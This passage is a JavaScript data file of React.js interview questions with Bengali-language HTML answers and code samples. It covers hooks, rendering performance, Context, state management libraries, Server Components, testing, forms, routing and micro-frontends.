
const reactjsQuestions = [
  {
    id: "react-1",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Virtual DOM","Reconciliation","Fiber"],
    question: "React-এর Virtual DOM, Reconciliation Algorithm এবং Fiber Architecture কীভাবে কাজ করে?",
    answer: `
      <p><strong>Virtual DOM</strong> হলো ব্রাউজারের Real DOM-এর একটি লাইটওয়েট JavaScript অবজেক্ট রিপ্রেজেন্টেশন (স্ন্যাপশট)। React স্টেট পরিবর্তনে নতুন Virtual DOM তৈরি করে এবং আগেরটির সাথে তুলনা (Diffing) করে।</p>
      <h4>Reconciliation Process:</h4>
      <ol>
        <li><strong>Diffing Algorithm:</strong> React দুটি Tree-কে তুলনা করে সর্বনিম্ন সংখ্যক পরিবর্তন খুঁজে বের করে। এটি ও (O(n)) টাইম কমপ্লেক্সিটি ব্যবহার করে।</li>
        <li><strong>Heuristics:</strong> ভিন্ন টাইপের এলিমেন্ট হলে পুরো সাবট্রি ধ্বংস করে নতুন তৈরি করে। একই টাইপের হলে শুধু অ্যাট্রিবিউট আপডেট করে।</li>
        <li><strong>Key Prop:</strong> লিস্টে <code>key</code> দিয়ে React বুঝতে পারে কোন এলিমেন্ট স্থান পরিবর্তন করেছে, যাতে কোনো DOM না ভেঙে স্থানান্তর করা যায়।</li>
      </ol>
      <h4>Fiber Architecture (React 16+):</h4>
      <p>React 15 এর Stack Reconciler সিঙ্ক্রোনাস ছিল, যা বড় অ্যাপে UI ফ্রিজ করত। React 16 এ <strong>Fiber</strong> আসে।</p>
      <ul>
        <li><strong>Linked List Tree:</strong> ফাইবার নোডগুলো লিঙ্কড লিস্টের মতো কাজ করে, যা রেন্ডারিংয়ের কাজকে ছোট ছোট ইউনিটে (Chunks) ভাগ করতে পারে।</li>
        <li><strong>Incremental Rendering:</strong> রেন্ডারিংয়ের কাজ থামিয়ে (pause) অন্য জরুরি কাজ (যেমন- ইউজার ইনপুট) করতে পারে এবং পরে আবার রেন্ডারিং শুরু করে।</li>
        <li><strong>Priority Scheduling:</strong> হাই প্রায়োরিটি (click, input) আগে এবং লো প্রায়োরিটি (data fetch) পরে সম্পন্ন হয়।</li>
      </ul>
    `
  },
  {
    id: "react-2",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Hooks","useState","useReducer","State Management"],
    question: "useState vs useReducer - কখন কোনটি ব্যবহার করবেন? Complex state management-এ useReducer কেন ভালো?",
    answer: `
      <p>Senior Developer হিসেবে সঠিক state management pattern বাছাই করা আর্কিটেকচারের জন্য গুরুত্বপূর্ণ।</p>
      <h4>useState ব্যবহার করুন যখন:</h4>
      <ul>
        <li>State সিম্পল (primitive value বা ছোট object)।</li>
        <li>State transitions সোজা (direct replacement)।</li>
        <li>কোনো জটিল লজিক ছাড়া শুধু ভ্যালু আপডেট করতে হবে।</li>
      </ul>
      <h4>useReducer ব্যবহার করুন যখন:</h4>
      <ul>
        <li>একাধিক related state একসাথে আপডেট করতে হয় (Atomic updates)।</li>
        <li>Next state, previous state-এর উপর জটিল লজিকের মাধ্যমে নির্ভরশীল।</li>
        <li>State transition logic কে কম্পোনেন্ট থেকে আলাদা করতে চান (Separation of concerns)।</li>
        <li>Testing-এ reducer function খুব সহজে pure function হিসেবে test করা যায়।</li>
      </ul>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// useReducer for complex form state
const initialState = {
  values: { name: '', email: '' },
  errors: {},
  isSubmitting: false
};

function formReducer(state, action) {
  switch (action.type) {
    case 'SET_FIELD':
      return {
        ...state,
        values: { ...state.values, [action.field]: action.value },
        errors: { ...state.errors, [action.field]: null }
      };
    case 'SUBMIT':
      return { ...state, isSubmitting: true };
    case 'RESET':
      return initialState;
    default:
      return state;
  }
}

const [state, dispatch] = useReducer(formReducer, initialState);
dispatch({ type: 'SET_FIELD', field: 'name', value: 'নাজমুল' });</code></pre>
      </div>
    `
  },
  {
    id: "react-3",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["useEffect","Cleanup","Dependencies","Memory Leak"],
    question: "useEffect-এর dependency array, cleanup function এবং common pitfalls কী কী? Memory leak কীভাবে প্রতিরোধ করবেন?",
    answer: `
      <p><strong>useEffect</strong> হলো React-এর side effect হ্যান্ডলিং hook। এর সঠিক ব্যবহার না জানলে performance issues এবং memory leaks হতে পারে।</p>
      <h4>Dependency Array Rules:</h4>
      <ul>
        <li><code>[]</code> — শুধুমাত্র mount-এ একবার চলে।</li>
        <li>কোনো array না দিলে — প্রতি render-এ চলে।</li>
        <li><code>[dep1]</code> — dep1 পরিবর্তন হলে চলে।</li>
      </ul>
      <h4>Memory Leak Prevention (Cleanup Functions):</h4>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ❌ Memory Leak: Component unmount হলেও setState হচ্ছে
useEffect(() => {
  fetch('/api/data').then(res => res.json())
    .then(data => setData(data));
}, []);

// ✅ AbortController দিয়ে API cleanup
useEffect(() => {
  const controller = new AbortController();
  fetch('/api/data', { signal: controller.signal })
    .then(res => res.json())
    .then(data => setData(data))
    .catch(err => {
      if (err.name !== 'AbortError') console.error(err);
    });
  return () => controller.abort(); // Cleanup!
}, []);

// ✅ Timer / Subscription cleanup
useEffect(() => {
  const ws = new WebSocket('wss://api.example.com');
  ws.onmessage = (event) => setMessages(prev => [...prev, event.data]);
  return () => ws.close(); // WebSocket বন্ধ করুন
}, []);</code></pre>
      </div>
      <p><strong>Senior Tip:</strong> ESLint-এর <code>exhaustive-deps</code> রুল অন রাখুন। ডেটা ফেচিংয়ের জন্য <code>useEffect</code> এর বদলে React Query বা Server Components ব্যবহার করুন।</p>
    `
  },
  {
    id: "react-4",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["useMemo","useCallback","Performance","Re-render"],
    question: "useMemo এবং useCallback কখন ব্যবহার করবেন? অতিরিক্ত ব্যবহারের সমস্যা কী?",
    answer: `
      <p>Performance optimization-এ এই দুটি হুক গুরুত্বপূর্ণ, কিন্তু অতিরিক্ত ব্যবহার (Over-optimization) উল্টো performance খারাপ করে কারণ নিজেই কিছু মেমোরি ও প্রসেসিং খরচ করে।</p>
      <h4>useMemo — Expensive computation ক্যাশ করে:</h4>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ✅ ভালো: বড় লিস্ট ফিল্টার বা সর্ট করার কাজ
const filteredProducts = useMemo(() => {
  return products.filter(p => p.category === selectedCategory);
}, [products, selectedCategory]);

// ❌ খারাপ: সাধারণ স্ট্রিং কনক্যাটনেশন মেমোাইজ করার দরকার নেই
const fullName = useMemo(() => firstName + ' ' + lastName, [firstName, lastName]);</code></pre>
      </div>
      <h4>useCallback — Function reference স্থির রাখে:</h4>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// ✅ ভালো: Child component React.memo দিয়ে wrapped আছে
const handleDelete = useCallback((id) => {
  setItems(prev => prev.filter(item => item.id !== id));
}, []);

// React.memo child — useCallback ছাড়া প্রতি render-এ re-render হবে
const ItemList = React.memo(({ items, onDelete }) => { ... });

// ❌ খারাপ: Child যদি React.memo না থাকে, তবে useCallback অর্থহীন</code></pre>
      </div>
      <p><strong>Lead Guideline:</strong> "প্রথমে measure করুন (Profiler), তারপর optimize করুন।" ব্লাইন্ডলি সবকিছু <code>useMemo</code> দেওয়া বন্ধ করুন।</p>
    `
  },
  {
    id: "react-5",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Custom Hooks","Reusability","Architecture"],
    question: "Custom Hook কীভাবে ডিজাইন করবেন? Best practices এবং real-world examples দিন।",
    answer: `
      <p>Custom Hook হলো React-এর সবচেয়ে শক্তিশালী composition pattern। Senior Developer হিসেবে reusable logic extract করা আপনার দায়িত্ব।</p>
      <h4>Design Principles:</h4>
      <ol>
        <li>নাম অবশ্যই <code>use</code> দিয়ে শুরু হবে (Linting support)।</li>
        <li>একটি নির্দিষ্ট concern handle করবে (Single Responsibility)।</li>
        <li>Composable হবে — অন্য hooks-এর সাথে মিলিয়ে ব্যবহার করা যাবে।</li>
        <li>Multiple unrelated states না রাখা। প্রয়োজনে আলাদা হুক বানানো।</li>
      </ol>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// useLocalStorage — Persistent state with SSR support
function useLocalStorage(key, initialValue) {
  const [storedValue, setStoredValue] = useState(() => {
    if (typeof window === "undefined") return initialValue;
    try {
      const item = window.localStorage.getItem(key);
      return item ? JSON.parse(item) : initialValue;
    } catch { return initialValue; }
  });

  const setValue = useCallback((value) => {
    setStoredValue(value);
    window.localStorage.setItem(key, JSON.stringify(value));
  }, [key]);

  return [storedValue, setValue];
}</code></pre>
      </div>
    `
  },
  {
    id: "react-6",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Context API","Provider Pattern","Performance"],
    question: "Context API-এর Performance সমস্যা কী? কীভাবে Context splitting এবং memoization দিয়ে সমাধান করবেন?",
    answer: `
      <p><strong>Context API</strong>-এর সবচেয়ে বড় সমস্যা: context value পরিবর্তন হলে সেই context consume করা <em>সব</em> component re-render হয়, এমনকি তারা context-এর যে অংশ ব্যবহার করে সেটা পরিবর্তন না হলেও।</p>
      <h4>সমাধান ১: Context Splitting (State ও Dispatch আলাদা)</h4>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>const UserStateContext = createContext();
const UserDispatchContext = createContext();

function UserProvider({ children }) {
  const [user, setUser] = useState(null);
  return (
    <UserStateContext.Provider value={user}>
      <UserDispatchContext.Provider value={setUser}>
        {children}
      </UserDispatchContext.Provider>
    </UserStateContext.Provider>
  );
}
// Component শুধু dispatch চাইলে state পরিবর্তনে re-render হবে না</code></pre>
      </div>
      <h4>সমাধান ২: useMemo দিয়ে value memoize</h4>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('dark');
  // value object memoize করুন যাতে reference পরিবর্তন না হয়
  const value = useMemo(() => ({ theme, setTheme }), [theme]);
  return <ThemeContext.Provider value={value}>{children}</ThemeContext.Provider>;
}</code></pre>
      </div>
      <p><strong>Modern Alternative:</strong> Context এর বদলে সিনিয়র লেভেলে এখন <code>Zustand</code> বা <code>Jotai</code> এর মতো লাইব্রেরি ব্যবহার করা হয়, যেগুলোতে শুধুমাত্র প্রয়োজনীয় স্টেট সাবস্ক্রাইব করা যায় (No unnecessary re-renders)।</p>
    `
  },
  {
    id: "react-7",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["HOC","Render Props","Compound Components"],
    question: "Higher-Order Components (HOC), Render Props এবং Compound Components Pattern কী? কখন কোনটি ব্যবহার করবেন?",
    answer: `
      <p>React-এ code reuse-এর জন্য তিনটি প্রধান advanced pattern আছে। আধুনিক React-এ এগুলোর ব্যবহার কমেছে কিন্তু লেগেসি কোড বা লাইব্রেরি ডিজাইনের জন্য জানা জরুরি।</p>
      <h4>1. Higher-Order Component (HOC):</h4>
      <p>একটি function যা component নেয় এবং enhanced component রিটার্ন করে। (যেমন- Redux-এর <code>connect</code>)।</p>
      <h4>2. Render Props:</h4>
      <p>একটি prop (সাধারণত <code>render</code> বা <code>children</code> হিসেবে function) যা কীভাবে রেন্ডার করতে হবে তা শেয়ার করে।</p>
      <h4>3. Compound Components (Best for UI Libraries):</h4>
      <p>একাধিক কম্পোনেন্ট একসাথে কাজ করে যার ভেতরে অন্তর্নিহিত State শেয়ার হয় (যেমন- Radix UI বা <code>&lt;select&gt;</code> ট্যাগ)।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// Compound Components Example
const TabsContext = createContext();

function Tabs({ children, defaultTab }) {
  const [activeTab, setActiveTab] = useState(defaultTab);
  return (
    <TabsContext.Provider value={{ activeTab, setActiveTab }}>
      <div className="tabs">{children}</div>
    </TabsContext.Provider>
  );
}
Tabs.Tab = function Tab({ id, children }) { /* context থেকে state পড়বে */ };
Tabs.Panel = function Panel({ id, children }) { /* context থেকে state পড়বে */ };

// ব্যবহার — খুবই পরিষ্কার API:
<Tabs defaultTab="overview">
  <Tabs.Tab id="overview">Overview</Tabs.Tab>
  <Tabs.Panel id="overview"><Overview /></Tabs.Panel>
</Tabs></code></pre>
      </div>
      <p><strong>Lead Decision:</strong> Modern React-এ Custom Hooks প্রায়ই HOC ও Render Props-কে replace করে। কিন্তু Compound Components UI library-তে এখনও অপরিহার্য।</p>
    `
  },
  {
    id: "react-8",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Redux","Zustand","State Management"],
    question: "Redux Toolkit vs Zustand vs React Query — কখন কোনটি ব্যবহার করবেন? Architecture decision কীভাবে নেবেন?",
    answer: `
      <p>State management library বাছাই করা একটি critical architectural decision। Senior/Lead Developer হিসেবে আপনাকে প্রজেক্টের চাহিদা বুঝে সিদ্ধান্ত নিতে হবে।</p>
      <h4>State-এর ধরন বুঝুন:</h4>
      <ul>
        <li><strong>Server State:</strong> API থেকে আসা data (caching, sync, invalidation প্রয়োজন) → <strong>React Query / TanStack Query</strong>। এটি Redux-এর API ফেচিংয়ের বোঝা কমায়।</li>
        <li><strong>Client State:</strong> UI state, form state, user preferences → <strong>Zustand / Redux Toolkit</strong>।</li>
        <li><strong>URL State:</strong> Filters, pagination, search → <strong>URL params / React Router</strong>।</li>
      </ul>
      <p><strong>Lead Decision:</strong> বেশিরভাগ মডার্ন অ্যাপে <strong>React Query (server state) + Zustand (client state)</strong> সবচেয়ে কার্যকর এবং হালকা combination। Redux Toolkit তখনই ব্যবহার করুন যখন অ্যাপে অনেক বড় গ্লোবাল ক্লায়েন্ট স্টেট এবং স্ট্রিক্ট আর্কিটেকচার দরকার।</p>
    `
  },
  {
    id: "react-9",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["React.memo","Performance","Profiling","Re-render"],
    question: "React-এ unnecessary re-renders কীভাবে চিহ্নিত করবেন এবং optimize করবেন?",
    answer: `
      <p>Re-render optimization হলো Senior Developer-এর অন্যতম গুরুত্বপূর্ণ দক্ষতা।</p>
      <h4>Re-render কখন হয়:</h4>
      <ol>
        <li>State পরিবর্তন হলে (নিজের বা parent-এর)।</li>
        <li>Props পরিবর্তন হলে (Reference change)।</li>
        <li>Context value পরিবর্তন হলে।</li>
      </ol>
      <h4>Optimization Strategies:</h4>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// 1. React.memo — শুধুমাত্র props পরিবর্তন হলে re-render
const ExpensiveList = React.memo(({ items, onSelect }) => { ... });

// 2. Children pattern — parent re-render হলেও children re-render হবে না
function Layout({ children }) {
  const [count, setCount] = useState(0);
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>
      {children} {/* এটি পুনরায় রেন্ডার হবে না */}
    </div>
  );
}

// 3. State colocation — State-কে যতটা সম্ভব কম্পোনেন্টের কাছে রাখুন</code></pre>
      </div>
      <h4>Profiling Tools:</h4>
      <ul>
        <li><strong>React DevTools Profiler:</strong> "Record" করে "Why did this render?" অপশন চালু করুন।</li>
        <li><strong>React Scan:</strong> ব্রাউজারে রিয়েল-টাইমে কোন কম্পোনেন্ট রি-রেন্ডার হচ্ছে তা হাইলাইট করে।</li>
      </ul>
    `
  },
  {
    id: "react-10",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Suspense","Lazy Loading","Code Splitting"],
    question: "React Suspense, lazy loading এবং Code Splitting কীভাবে implement করবেন?",
    answer: `
      <p>বড় অ্যাপ্লিকেশনে initial bundle size কমানো critical। React.lazy এবং Suspense দিয়ে route-based এবং component-based code splitting করা যায়।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>import { lazy, Suspense } from 'react';

// Dynamic import — আলাদা chunk হিসেবে bundle হবে
const Dashboard = lazy(() => import('./pages/Dashboard'));

function App() {
  return (
    <Suspense fallback={<FullPageSpinner />}>
      <Routes>
        <Route path="/dashboard" element={<Dashboard />} />
      </Routes>
    </Suspense>
  );
}

// Preloading — hover-এ load করুন navigation-এর আগে
function NavLink() {
  const preload = () => import('./pages/Settings');
  return <Link to="/settings" onMouseEnter={preload}>Settings</Link>;
}</code></pre>
      </div>
      <p><strong>Next.js Tip:</strong> Next.js App Router-এ <code>next/dynamic</code> ব্যবহার করে SSR সহ code splitting করা যায়।</p>
    `
  },
  {
    id: "react-11",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Error Boundary","Error Handling","Production"],
    question: "React Error Boundary কীভাবে implement করবেন? Production-এ error handling strategy কী হওয়া উচিত?",
    answer: `
      <p>Production-এ JavaScript error হলে পুরো UI crash হওয়া অগ্রহণযোগ্য। Error Boundary দিয়ে graceful error handling করতে হবে।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>import { ErrorBoundary } from 'react-error-boundary';

function App() {
  return (
    <ErrorBoundary 
      FallbackComponent={ErrorFallback}
      onError={(error, errorInfo) => logToSentry(error, errorInfo)}
      onReset={() => queryClient.invalidateQueries()} // Reset state on retry
    >
      <Dashboard />
    </ErrorBoundary>
  );
}</code></pre>
      </div>
      <p><strong>React 19 Update:</strong> এখন Function Component-এও <code>useTransition</code> এর মাধ্যমে Error Boundary এর মতো কাজ করানো যায় এবং <code>onUncaughtError</code> রুট কম্পোনেন্টে যোগ করা হয়েছে।</p>
    `
  },
  {
    id: "react-12",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["useRef","forwardRef","DOM"],
    question: "useRef-এর বিভিন্ন ব্যবহার কী কী? React 19-এ forwardRef এর কী হবে?",
    answer: `
      <p><strong>useRef</strong> দুটি প্রধান কাজে ব্যবহৃত হয়: DOM element অ্যাক্সেস এবং mutable value ধরে রাখা যা re-render trigger করে না।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// 1. DOM Access
const inputRef = useRef(null);
useEffect(() => { inputRef.current.focus(); }, []);

// 2. Storing mutable value without re-render (e.g., interval ID)
const intervalRef = useRef(null);
const start = () => { intervalRef.current = setInterval(() => {}, 1000); };</code></pre>
      </div>
      <h4>React 19 Update (Ref as Prop):</h4>
      <p>React 19 থেকে <code>forwardRef</code> এর আর প্রয়োজন নেই। আপনি সরাসরি <code>ref</code> কে একটি সাধারণ prop হিসেবে পাস করতে পারবেন।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// React 19
function FancyInput({ ref, ...props }) {
  return <input ref={ref} className="fancy-input" {...props} />;
}
// ব্যবহার: <FancyInput ref={inputRef} /></code></pre>
      </div>
    `
  },
  {
    id: "react-13",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Server Components","RSC","React 19"],
    question: "React Server Components (RSC) কী? Client Components থেকে কীভাবে আলাদা? React 19-এ নতুন কী এসেছে?",
    answer: `
      <p><strong>React Server Components (RSC)</strong> হলো React-এর নতুন paradigm যেখানে component সার্ভারে render হয় এবং শুধুমাত্র HTML/output ক্লায়েন্টে পাঠানো হয়। কোনো JavaScript bundle ক্লায়েন্টে যায় না।</p>
      <table style="width:100%; border-collapse:collapse; margin:1rem 0;">
        <tr style="border-bottom:1px solid #ccc;">
          <th style="text-align:left; padding:8px;">Feature</th>
          <th style="text-align:left; padding:8px;">Server Component</th>
          <th style="text-align:left; padding:8px;">Client Component</th>
        </tr>
        <tr style="border-bottom:1px solid #ccc;">
          <td style="padding:8px;">Directive</td><td style="padding:8px;">Default (কোনো directive নেই)</td><td style="padding:8px;">'use client'</td>
        </tr>
        <tr style="border-bottom:1px solid #ccc;">
          <td style="padding:8px;">useState/useEffect</td><td style="padding:8px;">❌ ব্যবহার করা যায় না</td><td style="padding:8px;">✅ ব্যবহার করা যায়</td>
        </tr>
        <tr>
          <td style="padding:8px;">Bundle Size Impact</td><td style="padding:8px;">Zero — JS পাঠায় না</td><td style="padding:8px;">Bundle-এ যোগ হয়</td>
        </tr>
      </table>
      <h4>React 19 Key Features:</h4>
      <ul>
        <li><strong>Actions & <code>useActionState</code>:</strong> Form submission এবং async operations সহজ করতে।</li>
        <li><strong><code>useOptimistic</code>:</strong> Optimistic UI updates করার জন্য নেটিভ হুক।</li>
        <li><strong>The <code>use()</code> API:</strong> Promise বা Context সরাসরি unwrap করার জন্য।</li>
      </ul>
    `
  },
  {
    id: "react-14",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Testing","React Testing Library","Jest"],
    question: "React component testing-এর best practices কী? Integration test vs Unit test কীভাবে লিখবেন?",
    answer: `
      <p>React Testing Library (RTL) ব্যবহারকারীর দৃষ্টিভঙ্গি থেকে test লিখতে encourage করে। "Implementation details test করবেন না, behavior test করুন।"</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

test('login form validates and submits', async () => {
  const mockLogin = jest.fn();
  render(<LoginForm onLogin={mockLogin} />);

  // ব্যবহারকারীর মতো interact করুন
  await userEvent.type(screen.getByLabelText(/email/i), 'user@test.com');
  await userEvent.type(screen.getByLabelText(/password/i), 'password123');
  await userEvent.click(screen.getByRole('button', { name: /login/i }));

  // Assertion
  expect(mockLogin).toHaveBeenCalledWith({
    email: 'user@test.com', password: 'password123'
  });
});</code></pre>
      </div>
      <p><strong>Senior Tip:</strong> MSW (Mock Service Worker) ব্যবহার করে নেটওয়ার্ক রিকোয়েস্ট মক করুন। এতে টেস্ট ও আসল অ্যাপের মধ্যে কোনো ফাঁক থাকে না।</p>
    `
  },
  {
    id: "react-15",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Form","React Hook Form","Validation"],
    question: "React-ে complex form handling কীভাবে করবেন? React Hook Form vs Formik — কোনটি ভালো?",
    answer: `
      <p>Complex form (multi-step, dynamic fields, file upload, conditional validation) হ্যান্ডল করা Senior Developer-এর গুরুত্বপূর্ণ দক্ষতা। <strong>React Hook Form (RHF)</strong> বর্তমানে সবচেয়ে জনপ্রিয়।</p>
      <h4>RHF এর সুবিধা:</h4>
      <ul>
        <li>Uncontrolled components ব্যবহার করে — প্রতিটি কীস্ট্রোকে রি-রেন্ডার হয় না (Formik-এর চেয়ে ফাস্ট)।</li>
        <li>Zod/Yup integration সহজ।</li>
      </ul>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

const schema = z.object({
  email: z.string().email('সঠিক ইমেইল দিন'),
});

function ProfileForm() {
  const { register, handleSubmit, formState: { errors } } = useForm({
    resolver: zodResolver(schema)
  });

  return (
    &lt;form onSubmit={handleSubmit(onSubmit)}&gt;
      &lt;input {...register('email')} /&gt;
      {errors.email && &lt;span&gt;{errors.email.message}&lt;/span&gt;}
    &lt;/form&gt;
  );
}</code></pre>
      </div>
    `
  },
  {
    id: "react-16",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["Routing","React Router","Protected Routes"],
    question: "React Router v6/v7-এর নতুন features কী কী? Protected routes কীভাবে implement করবেন?",
    answer: `
      <p>React Router v6 অনেক breaking changes এনেছে। সর্বশেষ v6.4+ এ Data Router (Loader/Action) যোগ হয়েছে, যা Remix-এর মতো কাজ করে।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// Protected Route Component
function ProtectedRoute({ children, requiredRole }) {
  const { user, isLoading } = useAuth();
  const location = useLocation();

  if (isLoading) return <LoadingSpinner />;
  if (!user) return <Navigate to="/login" state={{ from: location }} replace />;
  if (requiredRole && user.role !== requiredRole) return <Navigate to="/unauthorized" replace />;
  
  return children;
}

// App routing with nested layouts
function App() {
  return (
    <Routes>
      <Route element={<ProtectedRoute><DashboardLayout /></ProtectedRoute>}>
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/admin" element={
          <ProtectedRoute requiredRole="admin"><AdminPanel /></ProtectedRoute>
        } />
      </Route>
    </Routes>
  );
}</code></pre>
      </div>
    `
  },
  {
    id: "react-17",
    category: "React.js",
    difficulty: "Advanced",
    tags: ["Micro-Frontend","Module Federation","Architecture"],
    question: "React Micro-Frontend Architecture কী? Module Federation দিয়ে কীভাবে implement করবেন?",
    answer: `
      <p>বড় organization-ে একাধিক টিম একই অ্যাপে কাজ করলে Micro-Frontend architecture ব্যবহার করা হয়। Lead Developer হিসেবে এটি একটি critical architectural decision।</p>
      <h4>Approaches:</h4>
      <ol>
        <li><strong>Module Federation (Webpack 5/Rspack):</strong> Runtime-এ আলাদা build-এর component share করে।</li>
        <li><strong>Build-time integration:</strong> NPM packages হিসেবে (Monorepo)।</li>
      </ol>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// Module Federation — Host App webpack.config.js
new ModuleFederationPlugin({
  name: 'host',
  remotes: { dashboard: 'dashboard@http://localhost:3001/remoteEntry.js' },
  shared: { react: { singleton: true }, 'react-dom': { singleton: true } },
});

// Host App — lazy load remote component
const RemoteDashboard = React.lazy(() => import('dashboard/DashboardApp'));</code></pre>
      </div>
      <p><strong>Lead Decision Points:</strong> টিম সাইজ ১০+ এবং আলাদা deploy cycle দরকার হলেই MFE বিবেচনা করুন। Shared dependency (React version) management critical।</p>
    `
  },
  {
    id: "react-18",
    category: "React.js",
    difficulty: "Intermediate",
    tags: ["JSX","Babel","SWC"],
    question: "JSX আসলে কী? ব্রাউজার কীভাবে JSX বোঝে? Babel বা SWC এখানে কী ভূমিকা পালন করে?",
    answer: `
      <p><strong>JSX</strong> হলো JavaScript-ের একটি syntax extension যা HTML-এর মতো দেখতে কিন্তু আসলে JavaScript function call-ে রূপান্তরিত হয়।</p>
      <div class="code-box">
        <div class="code-header"><span>javascript</span><button class="copy-btn">Copy</button></div>
        <pre><code>// আপনি লিখেন (JSX):
const element = <h1 className="card">Hello {name}</h1>;

// Babel/SWC রূপান্তর করে (React 17+ automatic runtime):
import { jsx as _jsx } from 'react/jsx-runtime';
const element = _jsx("h1", { className: "card", children: ["Hello ", name] });</code></pre>
      </div>
      <p><strong>Modern Trend:</strong> Babel এর বদলে এখন <strong>SWC</strong> (Rust-based) বা <strong>Rsbuild</strong> ব্যবহার করা হয়, যা Babel-এর চেয়ে ২০ গুণ বেশি ফাস্ট।</p>
    `
  },
  {
    id: "react-19",
    category: "React.js",
    difficulty: "Beginner",
    tags: ["Component","Props","State"],
    question: "React-ে Functional Component কী? Props এবং State-এর মধ্যে পার্থক্য কী?",
    answer: `
      <p><strong>Functional Component</strong> হলো একটি সাধারণ JavaScript ফাংশন যা JSX রিটার্ন করে — React 16.8-এ hooks আসার পর থেকে এটিই আধুনিক React-এর মানদণ্ড, ক্লাস কম্পোনেন্টের প্রায় সম্পূর্ণ প্রতিস্থাপন।</p>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>function UserCard({ name, role }) {          // props প্যারামিটার হিসেবে
  const [expanded, setExpanded] = useState(false);   // state hook দিয়ে

  return (
    <div onClick={() => setExpanded(!expanded)}>
      <h3>{name}</h3>
      {expanded && <p>ভূমিকা: {role}</p>}
    </div>
  );
}</code></pre>
      </div>
      <h4>Props বনাম State — মূল পার্থক্য</h4>
      <table>
        <tr><th>দিক</th><th>Props</th><th>State</th></tr>
        <tr><td>উৎস</td><td>প্যারেন্ট কম্পোনেন্ট থেকে আসে</td><td>কম্পোনেন্টের নিজের ভেতরে তৈরি</td></tr>
        <tr><td>পরিবর্তনযোগ্যতা</td><td><strong>Read-only</strong> — কম্পোনেন্ট নিজে বদলাতে পারে না</td><td>পরিবর্তনযোগ্য (<code>setState</code>/hook দিয়ে)</td></tr>
        <tr><td>মালিকানা</td><td>প্যারেন্টের</td><td>কম্পোনেন্টের নিজের</td></tr>
        <tr><td>উদ্দেশ্য</td><td>প্যারেন্ট → চাইল্ড ডেটা পাস করা</td><td>কম্পোনেন্টের নিজস্ব পরিবর্তনশীল অবস্থা</td></tr>
        <tr><td>বদলালে যা হয়</td><td>প্যারেন্ট re-render করলে চাইল্ডও re-render</td><td>কম্পোনেন্ট নিজেই re-render হয়</td></tr>
      </table>
      <h4>"Read-only" নিয়ম কেন গুরুত্বপূর্ণ</h4>
      <p>Props সরাসরি বদলানো (<code>props.name = "নতুন"</code>) React-এর <strong>unidirectional data flow</strong> ভেঙে দেয় — ডেটা কোথা থেকে এলো তা ট্র্যাক করা অসম্ভব হয়ে যায়। এর বদলে child একটি callback prop (যেমন <code>onUpdate</code>) কল করে parent-কে জানায়, parent তার নিজের state বদলায়, এবং সেই নতুন মান props হয়ে আবার child-এ ফিরে আসে — এই এক-দিকের প্রবাহই React-এর predictability-র ভিত্তি।</p>
      <h4>Functional বনাম Class — কেন functional জিতেছে</h4>
      <ul>
        <li><strong>Hooks দিয়ে সহজ যুক্তি পুনর্ব্যবহার:</strong> একাধিক ফিচার (data fetching, subscription) মেশানো ছাড়া custom hook-এ আলাদা করা যায় — ক্লাসে HOC/render-props-এর জটিলতা লাগত।</li>
        <li><strong>ছোট, পড়া সহজ:</strong> <code>this</code> বাইন্ডিং, lifecycle মেথডের ছড়িয়ে থাকা লজিক নেই।</li>
        <li><strong>ভবিষ্যতের React ফিচার</strong> (Server Components, Suspense, Concurrent features) মূলত functional component-কেন্দ্রিক ডিজাইন করা।</li>
      </ul>
